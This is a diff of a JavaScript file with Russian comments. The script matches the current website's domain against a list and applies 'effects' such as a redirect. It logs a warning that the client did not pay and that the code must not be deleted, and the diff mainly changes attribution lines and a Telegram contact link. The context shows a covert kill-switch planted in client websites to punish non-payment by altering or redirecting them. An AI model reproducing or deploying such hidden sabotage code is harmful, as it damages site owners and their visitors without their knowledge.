@@ -18,7 +18,6 @@ const sites = [
 // Массив с эффектами
 const effects = {
   none: () => {
-    console.log("Made by Abros Studio → https://abros.me\nDaniel Abros → https://t.me/abrosxd");
   },
   redirect: (redirectUrl) => {
     console.log(`Применяется эффект redirect на ${redirectUrl}`);
@@ -62,14 +61,12 @@ function checkDomain() {
   // Проверка, есть ли текущий домен в списке
   const siteInfo = sites.find(site => currentDomain === new URL(site.url).hostname);
   
-  if (!siteInfo) {
-    console.log("Made by Abros Studio → https://abros.me\nDaniel Abros → https://t.me/abrosxd");
-  } else {
+  if (siteInfo) {
     // Применение эффекта, если домен найден в списке
     const effectFunction = effects[siteInfo.effect];
     if (effectFunction) {
       effectFunction(siteInfo.redirecturl || siteInfo.date);
-      console.log("Этот заказчик не оплатил мою работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nDaniel Abros → https://t.me/abrosxd");
+      console.log("Этот заказчик не оплатил заказанную работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nTelegram Group → https://t.me/d3usn0tam");
     }
   }
 }
